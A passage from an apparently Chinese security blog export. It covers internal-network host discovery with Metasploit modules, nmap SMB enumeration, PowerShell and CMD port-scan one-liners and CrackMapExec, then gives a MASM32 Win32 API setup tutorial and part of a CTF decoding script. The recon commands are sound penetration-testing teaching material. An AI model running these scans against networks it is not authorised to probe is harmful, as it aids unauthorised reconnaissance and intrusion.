<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum</pre></td></tr><tr><td data-num="2"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum<span class="token punctuation">)</span> <span class="token operator">></span> show options</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206172933235.png" alt="image-20211206172933235" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> <span class="token constant">THREADS</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="2"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> <span class="token constant">RHOSTS</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206173041858.png" alt="image-20211206173041858" /></p>
<h1 id="00x06-smb协议探测"><a class="anchor" href="#00x06-smb协议探测">#</a> 00x06 SMB 协议探测</h1>
<h2 id="61-基于msf"><a class="anchor" href="#61-基于msf">#</a> 6.1 基于 msf</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>scanner<span class="token operator">/</span>snmp<span class="token operator">/</span>snmp_enum</pre></td></tr></table></figure><p><img data-src="C:%5CUsers%5C86183%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211206173236102.png" alt="image-20211206173236102" /></p>
<h2 id="62-基于nmap"><a class="anchor" href="#62-基于nmap">#</a> 6.2 基于 nmap</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap ‐sU ‐sS ‐‐script smb‐<span class="token keyword">enum</span>‐shares<span class="token punctuation">.</span>nse ‐p <span class="token number">445</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206173525338.png" alt="image-20211206173525338" /></p>
<h2 id="63-基于cmd"><a class="anchor" href="#63-基于cmd">#</a> 6.3 基于 CMD</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token operator">/</span>l <span class="token operator">%</span>a <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">)</span> <span class="token keyword">do</span> start <span class="token operator">/</span>min <span class="token operator">/</span>low telnet <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>a <span class="token number">445</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/1561366-20191129183015289-1878485326.png" alt="img" /></p>
<h2 id="64-基于powershell的一句话扫描"><a class="anchor" href="#64-基于powershell的一句话扫描">#</a> 6.4 基于 powershell 的一句话扫描</h2>
<h3 id="单ip"><a class="anchor" href="#单ip">#</a> 单 IP：</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">445</span> <span class="token operator">|</span> <span class="token operator">%</span><span class="token punctuation">&#123;</span> echo <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span>‐object <span class="token class-name">Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"192.168.1.119"</span><span class="token punctuation">,</span>$_<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">"$_ is open"</span><span class="token punctuation">&#125;</span> <span class="token number">2</span><span class="token operator">></span>$<span class="token keyword">null</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206173816188.png" alt="image-20211206173816188" /></p>
<h3 id="多ip"><a class="anchor" href="#多ip">#</a> 多 ip：</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1.</span><span class="token number">.5</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">&#123;</span> $a <span class="token operator">=</span> $_<span class="token punctuation">;</span> <span class="token number">445</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">&#123;</span>echo <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span>‐object <span class="token class-name">Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"192.168.1.$a"</span><span class="token punctuation">,</span>$_<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">"Port $_ is open"</span><span class="token punctuation">&#125;</span> <span class="token number">2</span><span class="token operator">></span>$<span class="token keyword">null</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206173839511.png" alt="image-20211206173839511" /></p>
<h3 id="多port多ip"><a class="anchor" href="#多port多ip">#</a> 多 port，多 IP：</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">118.</span><span class="token number">.119</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">&#123;</span> $a <span class="token operator">=</span> $_<span class="token punctuation">;</span> write‐host <span class="token string">"‐‐‐‐‐‐"</span><span class="token punctuation">;</span> write‐host<span class="token string">"192.168.1.$a"</span><span class="token punctuation">;</span> <span class="token number">80</span><span class="token punctuation">,</span><span class="token number">445</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">&#123;</span><span class="token function">echo</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span>‐object Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"192.168.1.$a"</span><span class="token punctuation">,</span>$<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">"Port $_ is open"</span><span class="token punctuation">&#125;</span> <span class="token number">2</span><span class="token operator">></span>$<span class="token keyword">null</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/1561366-20191129183425508-933572275.png" alt="img" /></p>
<h2 id="65-crackmapexec"><a class="anchor" href="#65-crackmapexec">#</a> 6.5 crackmapexec</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL0NyYWNrTWFwRXhlYw==">项目地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#最方便：</pre></td></tr><tr><td data-num="2"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install crackmapexec</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206174512814.png" alt="image-20211206174512814" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#避免有坑：</pre></td></tr><tr><td data-num="2"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install <span class="token operator">-</span>y libssl<span class="token operator">-</span>dev libffi<span class="token operator">-</span>dev python<span class="token operator">-</span>dev build<span class="token operator">-</span>essential</pre></td></tr><tr><td data-num="3"></td><td><pre>pip install <span class="token operator">--</span>user pipenv</pre></td></tr><tr><td data-num="4"></td><td><pre>git clone <span class="token operator">--</span>recursive https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cnpmjs<span class="token punctuation">.</span>org<span class="token operator">/</span>byt3bl33d3r<span class="token operator">/</span>CrackMapExec</pre></td></tr><tr><td data-num="5"></td><td><pre>cd CrackMapExec <span class="token operator">&amp;&amp;</span> pipenv install</pre></td></tr><tr><td data-num="6"></td><td><pre>pipenv shell</pre></td></tr><tr><td data-num="7"></td><td><pre>python setup<span class="token punctuation">.</span>py install</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206180236994.png" alt="image-20211206180236994" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206180905729.png" alt="image-20211206180905729" /></p>
<p>默认为 100 线程:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# CrackMapExec smb <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206182651696.png" alt="image-20211206182651696" /></p>
<h1 id="00x07-msf探测辅助模块汇总"><a class="anchor" href="#00x07-msf探测辅助模块汇总">#</a> 00x07 MSF 探测辅助模块汇总</h1>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep    #基于arp协议发现内网存活主机，这不能通过代理使用</pre></td></tr><tr><td data-num="2"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack           #基于tcp的ack回复进行端口扫描，默认扫描<span class="token number">1</span><span class="token operator">-</span><span class="token number">10000</span>端口</pre></td></tr><tr><td data-num="3"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp           #基于tcp进行端口扫描，默认扫描<span class="token number">1</span><span class="token operator">-</span><span class="token number">10000</span>端口</pre></td></tr><tr><td data-num="4"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep    #基于udp协议发现内网存活主机</pre></td></tr><tr><td data-num="5"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe    #基于udp协议发现内网存活主机</pre></td></tr><tr><td data-num="6"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname         #基于netbios协议发现内网存活主机</pre></td></tr></table></figure><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version        #发现内网ftp服务，基于默认<span class="token number">21</span>端口</pre></td></tr><tr><td data-num="2"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version        #发现内网ssh服务，基于默认<span class="token number">22</span>端口</pre></td></tr><tr><td data-num="3"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version  #发现内网telnet服务，基于默认<span class="token number">23</span>端口</pre></td></tr><tr><td data-num="4"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp            #发现dns服务，基于默认<span class="token number">53</span>端口</pre></td></tr><tr><td data-num="5"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version      #发现内网http服务，基于默认<span class="token number">80</span>端口</pre></td></tr><tr><td data-num="6"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title             #探测内网http服务的标题</pre></td></tr><tr><td data-num="7"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version        #发现内网smb服务，基于默认的<span class="token number">445</span>端口   </pre></td></tr><tr><td data-num="8"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mssql<span class="token operator">/</span>mssql_schemadump  #发现内网SQLServer服务<span class="token punctuation">,</span>基于默认的<span class="token number">1433</span>端口</pre></td></tr><tr><td data-num="9"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>oracle<span class="token operator">/</span>oracle_hashdump  #发现内网oracle服务<span class="token punctuation">,</span>基于默认的<span class="token number">1521</span>端口 </pre></td></tr><tr><td data-num="10"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version    #发现内网mysql服务，基于默认<span class="token number">3306</span>端口</pre></td></tr><tr><td data-num="11"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>rdp_scanner        #发现内网<span class="token constant">RDP</span>服务，基于默认<span class="token number">3389</span>端口</pre></td></tr><tr><td data-num="12"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>redis<span class="token operator">/</span>redis_server     #发现内网Redis服务，基于默认<span class="token number">6379</span>端口</pre></td></tr><tr><td data-num="13"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version        #探测内网的db2服务，基于默认的<span class="token number">50000</span>端口</pre></td></tr><tr><td data-num="14"></td><td><pre>    auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname         #探测内网主机的netbios名字</pre></td></tr></table></figure><p>在实战过程中，许多特殊环境下 <code>scanner</code> ， <code>db_nmap</code>  不能快速符合实战渗透诉求，尤其在域中的主机存活发现，而 <code>gather/post</code>  下的模块，弥补了该诉求，以便快速了解域中存活主机。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>arp_scanner</pre></td></tr><tr><td data-num="2"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_computers</pre></td></tr><tr><td data-num="3"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_computers</pre></td></tr><tr><td data-num="4"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domain</pre></td></tr><tr><td data-num="5"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_domains</pre></td></tr><tr><td data-num="6"></td><td><pre>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_ad_user_comments</pre></td></tr><tr><td data-num="7"></td><td><pre>run windows<span class="token operator">/</span>gather<span class="token operator">/</span>arp_scanner <span class="token constant">RHOSTS</span><span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.110</span>‐<span class="token number">120</span> <span class="token constant">THREADS</span><span class="token operator">=</span><span class="token number">20</span></pre></td></tr></table></figure><h1 id="00x08感言"><a class="anchor" href="#00x08感言">#</a> 00x08 感言</h1>
<p>毫无话语敢言！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206180627809.png" alt="image-20211206180627809" /></p>
<h1 id="00x09参考链接"><a class="anchor" href="#00x09参考链接">#</a> 00x09 参考链接</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vLW1vLS9wLzExOTA4MjYwLmh0bWw=">总结 \ 多种方式探测内网存活主机</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWWFuZzM0L3AvMTQ0MTE0OTcuaHRtbA==">域渗透之 CrackMapExec</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>一篇文章教会你如何更为简便的使用Win32-API</title>
    <url>/article/1df94188.html</url>
    <content><![CDATA[<p>通过这篇文章我们来了解一下如何更为简便的调用我们 windows 的一个 API。</p>
<p>在之前的学习中我们就已经知道了如何使用 API，但是要求我们先包含各种各样的东西，再接着写的那种方式操作起来并不容易。比如说你要先声明，然后在声明完之后，你要把类型都标记出来，然后再写。</p>
<p>那么有没有一种方法就是直接可以调用 win32 的 API 的呢，其实呢这种方法也是有的，那么接下来我们一起来学习一下如和配置这种环境。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119192551666.png" alt="image-20220119192551666" /></p>
<p>首先呢，我们还是正常的新建一个 asm 的一个项目，具体流程参考<a href="https://www.21r000.top/2022/01/17/e0c9facc.html#0x03%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">这篇文章中的汇编语言环境搭建</a></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119193711841.png" alt="image-20220119193711841" /></p>
<h2 id="安装masm32"><a class="anchor" href="#安装masm32">#</a> 安装 masm32</h2>
<p>创建完成之后，我们想要更简便的使用 win32 的 api，我们还要借助 masm 的变种 masm32</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119193942837.png" alt="image-20220119193942837" /></p>
<p>点击 Download</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119194046483.png" alt="image-20220119194046483" /></p>
<p>下载我们所需要的版本</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119194151129.png" alt="image-20220119194151129" /></p>
<p>下载完成之后，双击打开得到一个 install 文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119194811910.png" alt="image-20220119194811910" /></p>
<p>双击进行安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119194916939.png" alt="image-20220119194916939" /></p>
<p>点击 install，选择安装目录</p>
<p><strong>注</strong>：目录要自己记得下面还要用到！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119195000702.png" alt="image-20220119195000702" /></p>
<p>一路默认确定即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119195128329.png" alt="image-20220119195128329" /></p>
<p><strong>注</strong>：若安装时间较长，请耐心等候。</p>
<p>安装完成显示</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119195646666.png" alt="image-20220119195646666" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119195757465.png" alt="image-20220119195757465" /></p>
<p>安装完成之后会在你所选择的目录下生成一个 masm32 文件夹</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119195929508.png" alt="image-20220119195929508" /></p>
<p>点进去可以看到各种配置文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119200037523.png" alt="image-20220119200037523" /></p>
<p>inculde 和 lib 目录是我们接下来会用到的目录</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119200137554.png" alt="image-20220119200137554" /></p>
<h2 id="配置所需include-path和附加库"><a class="anchor" href="#配置所需include-path和附加库">#</a> 配置所需 Include Path 和附加库</h2>
<p>接下来打开我们的项目右键打开属性面板</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119200339883.png" alt="image-20220119200339883" /></p>
<p>在 <code>Microsoft Macro Assembler</code>  中选择 <code>General</code> ，并配置它的 <code>Include Path</code>  变量</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119200450041.png" alt="image-20220119200450041" /></p>
<p>点击 &lt;编辑...&gt;</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119200753169.png" alt="image-20220119200753169" /></p>
<p>进行如下勾选，一般为默认</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119200847130.png" alt="image-20220119200847130" /></p>
<p>然后我们将 masm32 的 include 文件夹路径填写进去之后，显示如下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201053802.png" alt="image-20220119201053802" /></p>
<p>点击确定之后显示如下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201139357.png" alt="image-20220119201139357" /></p>
<p>点击 “应用”</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201206827.png" alt="image-20220119201206827" /></p>
<p>接下来我们打开 “链接器” 的 “常规” 面板配置其 “附加库目录”</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201302908.png" alt="image-20220119201302908" /></p>
<p>进入编辑模式后点击右上角的 “...&quot;，选择所需文件夹</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201446348.png" alt="image-20220119201446348" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201537329.png" alt="image-20220119201537329" /></p>
<p>找到 masm32 的 lib 目录</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201621325.png" alt="image-20220119201621325" /></p>
<p>结果显示</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201704897.png" alt="image-20220119201704897" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119201719850.png" alt="image-20220119201719850" /></p>
<p>依次点击 &quot;应用&quot;-&gt;&quot;确定&quot; 即可。</p>
<p>如此我们就能更加方便的使用 win32 的 api 了。</p>
<h2 id="样例测试"><a class="anchor" href="#样例测试">#</a> 样例测试</h2>
<p>测试代码</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">;</span>大小写敏感设置</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">;</span>导入头文件进行声名，在C语言中为windows<span class="token punctuation">.</span>h</pre></td></tr><tr><td data-num="8"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="13"></td><td><pre>text db <span class="token string">"hahaha你瞅啥"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span>编写代码段</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">;</span>堆栈平衡</pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">;</span>push <span class="token number">0</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token punctuation">;</span>push offset text</pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token punctuation">;</span>push offset text</pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">;</span>push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token punctuation">;</span>call MessageBox</pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span><span class="token number">16</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	</pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token punctuation">;</span>INVOKE<span class="token operator">:</span>伪编译</pre></td></tr><tr><td data-num="27"></td><td><pre>	INVOKE MessageBox<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>offset text<span class="token punctuation">,</span>offset text<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	INVOKE ExitProcess<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="29"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="30"></td><td><pre>END main</pre></td></tr></table></figure><p>运行结果</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119211510253.png" alt="image-20220119211510253" /></p>
<h2 id="关于报错"><a class="anchor" href="#关于报错">#</a> 关于报错</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119213658720.png" alt="image-20220119213658720" /></p>
<p>错误原因<br />
高于 14.26.28801 的 msvc 工具集编译不了 masm32v11r 环境的汇编</p>
<p>解决方案</p>
<p><strong>1. 更改 msvc 工具集版本</strong><br />
打开：Visual Studio Installer，选择修改输入 MSVC，安装 <code>MSVC v14x - VS 201x C++ x64/x86 生成工具(v14.xxxx)</code>  以下任意一个版本的工具即可：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119214211986.png" alt="image-20220119214211986" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119214931295.png" alt="image-20220119214931295" /></p>
<p>等待修改完成即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220119214306809.png" alt="image-20220119214306809" /></p>
<p><strong>2. 修改项目的 MSVC 的版本</strong><br />
<strong>右键项目</strong> -&gt;<strong> 属性</strong> -&gt;<strong> 配置属性</strong> -&gt;<strong> 高级</strong> -&gt;<strong>MSVC 工具集版本</strong> -&gt; 选择低于或等于 14.26 的 msvc 工具集即可。</p>
<p><code>注：强烈建议使用2015或2017版本，不存在高配置不兼容问题！</code></p>
<p>（ps：出现以上问题不排除可能因为小编实力没到位的问题 QAQ！！！）</p>
<p>这里使用 2015 版的配置一下就好了，没有什么奇奇怪怪的问题，还可以安装 Asm 高亮渲染插件！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220120222322181.png" alt="image-20220120222322181" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制解码</title>
    <url>/article/66f43719.html</url>
    <content><![CDATA[<h2 id="二进制幂数解码"><a class="anchor" href="#二进制幂数解码">#</a> 二进制幂数解码</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>a<span class="token operator">=</span><span class="token string">"8842101220480224404014224202480122"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#分隔</span></pre></td></tr><tr><td data-num="3"></td><td><pre>a<span class="token operator">=</span>a<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>flag<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#遍历</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">list</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">sum</span><span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token builtin">sum</span> <span class="token operator">+=</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    flag <span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span> <span class="token 